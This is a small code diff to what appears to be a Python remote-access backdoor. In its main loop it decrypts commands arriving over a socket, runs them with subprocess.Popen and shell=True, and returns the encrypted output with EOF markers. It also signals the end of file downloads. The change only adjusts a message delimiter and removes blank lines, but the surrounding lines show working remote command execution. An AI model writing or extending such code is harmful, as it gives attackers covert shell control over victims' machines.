@@ -49,12 +49,9 @@ while 1:
             time.sleep(0.8)
             s.sendall('EOFEOFEOFEOFEOFX')
             time.sleep(0.8)
-            s.sendall(box.encrypt('Download is finished'))
+            s.sendall(box.encrypt('Download is finished.EOFEOFEOFEOFEOFX'))
 
     else:
-
-
-
             proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             stdoutput = proc.stdout.read() + proc.stderr.read()
             stdoutputEnc = box.encrypt(stdoutput + 'EOFEOFEOFEOFEOFX')
